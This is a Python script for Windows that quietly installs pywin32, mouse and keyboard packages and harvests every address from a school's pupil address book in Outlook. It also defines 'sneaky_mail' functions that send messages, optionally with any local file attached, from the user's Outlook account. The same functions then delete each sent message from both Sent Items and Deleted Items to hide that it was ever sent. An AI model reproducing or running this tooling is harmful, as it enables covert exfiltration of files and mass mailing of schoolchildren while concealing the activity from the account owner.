import subprocess
import os
import sys
import asyncio
import time
import shutil 
import tkinter

new_installs = ["pywin32","mouse","keyboard",]

already_packages = subprocess.run(
    [sys.executable, "-m", "pip", "list"],
    capture_output=True,
    text=True)

lines = already_packages.stdout.strip().split("\n")[2:]  # skip the "Package  Version" header + separator row
installed_packages = [line.split()[0] for line in lines]

for item in new_installs:
    if not item in installed_packages:

        # autommatically imports all the neccisarry package hopefully there the rightones
        result1 = subprocess.run([sys.executable, "-m", "pip", "install", str(item), "-q"],capture_output=True,text=True)
        if result1.returncode != 0:
            print("failed loading.. . . ..")
            print(result1.stdout)
            print(result1.stderr)
        else:
            print("succsesfull loading.... ")
    else:
        print("already imported")

# ignores the impors so that it doesent crash on startup

import win32com.client # type: ignore
import pythoncom       # type: ignore
import keyboard        # type: ignore
import mouse           # type: ignore

# get all adresses from the "Pupils (Hinckley School)" address book outlook as a standard
# returns 'emails' as a list btw
def get_global_address_list(addresslist = "Pupils (Hinckley School)") -> list:
    pythoncom.CoInitialize()
    outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
    address_lists = outlook.AddressLists
    gal = address_lists[addresslist]
    emails = []
    for entry in gal.AddressEntries:
        try:
            emails.append(entry.Address)
        except Exception as e:
            print(f"Error reading GAL entry: {e}")
    return emails

def delete_sent_email(subject):
    try:
        outlook = win32com.client.Dispatch("Outlook.Application")
        ns = outlook.GetNamespace("MAPI")
 
        sent = ns.GetDefaultFolder(5)  # Sent Items
        subj = subject.replace("'", "''")
        found = list(sent.Items.Restrict(f"[Subject] = '{subj}'"))
 
        if not found:
            return False
 
        for mail in found:
            mail.Delete()  # just moves it to Deleted Items for now
 
        # go back and clear it out of Deleted Items too
        deleted = ns.GetDefaultFolder(3)
        leftovers = list(deleted.Items.Restrict(f"[Subject] = '{subj}'"))
        for mail in leftovers:
            mail.Delete()  # this time it's actually gone
 
        return True
 
    except Exception as e:
        print(e)
        return False

def sneaky_mail(reciever:str,subject,body) -> bool:
    try:
        outlook = win32com.client.Dispatch("Outlook.Application")
        olmailitem = 0x0
        # Create a new email pretty slef explanitory
        newmail = outlook.CreateItem(olmailitem)
        newmail.Subject = subject
        newmail.To = reciever
        newmail.Body = body

        # Send the email
        newmail.Send()

        delete_sent_email(subject)

    except ConnectionError or ConnectionRefusedError as error:
        print(error)
        return False

    return True

def sneaky_mail_attachment(reciever:str,subject,body,attachment_path) -> bool:
    try:
        outlook = win32com.client.Dispatch("Outlook.Application")
        olmailitem = 0x0
        # Create a new email same as 86
        newmail = outlook.CreateItem(olmailitem)
        newmail.Subject = subject
        newmail.To = reciever
        newmail.Body = body
        attach = r""+attachment_path
        newmail.Attachments.Add(attach)

        # Send the email
        newmail.Send()
        delete_sent_email(subject)

    except ConnectionError or ConnectionRefusedError as error:
        print(error)
        return False

    return True

